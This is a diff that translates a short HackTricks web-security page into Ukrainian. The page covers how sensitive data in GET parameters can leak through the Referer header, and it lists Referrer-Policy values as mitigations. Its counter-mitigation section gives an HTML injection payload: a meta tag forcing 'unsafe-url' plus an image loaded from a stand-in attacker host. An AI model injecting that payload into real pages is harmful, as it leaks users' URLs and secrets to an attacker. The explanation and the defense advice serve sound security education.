@@ -1,17 +1,16 @@
 {{#include ./banners/hacktricks-training.md}}
 
-# Referrer headers and policy
+# Заголовки реферера та політика
 
-Referrer is the header used by browsers to indicate which was the previous page visited.
+Реферер - це заголовок, який використовують браузери, щоб вказати, яка була попередня відвідана сторінка.
 
-## Sensitive information leaked
+## Витік чутливої інформації
 
-If at some point inside a web page any sensitive information is located on a GET request parameters, if the page contains links to external sources or an attacker is able to make/suggest (social engineering) the user visit a URL controlled by the attacker. It could be able to exfiltrate the sensitive information inside the latest GET request.
+Якщо в якийсь момент на веб-сторінці будь-яка чутлива інформація знаходиться в параметрах GET-запиту, якщо сторінка містить посилання на зовнішні джерела або зловмисник може змусити/порадити (соціальна інженерія) користувачу відвідати URL, контрольований зловмисником. Це може дозволити ексфільтрувати чутливу інформацію з останнього GET-запиту.
 
-## Mitigation
+## Пом'якшення
 
-You can make the browser follow a **Referrer-policy** that could **avoid** the sensitive information to be sent to other web applications:
-
+Ви можете змусити браузер дотримуватись **Referrer-policy**, яка може **запобігти** відправці чутливої інформації в інші веб-додатки:
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -22,19 +21,15 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
+## Контрзаходи
 
-## Counter-Mitigation
-
-You can override this rule using an HTML meta tag (the attacker needs to exploit and HTML injection):
-
+Ви можете переопределити це правило, використовуючи HTML мета-тег (зловмисник повинен експлуатувати та HTML-ін'єкцію):
 ```markup
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
+## Захист
 
-## Defense
-
-Never put any sensitive data inside GET parameters or paths in the URL.
+Ніколи не розміщуйте чутливі дані в параметрах GET або шляхах в URL. 
 
 {{#include ./banners/hacktricks-training.md}}
-
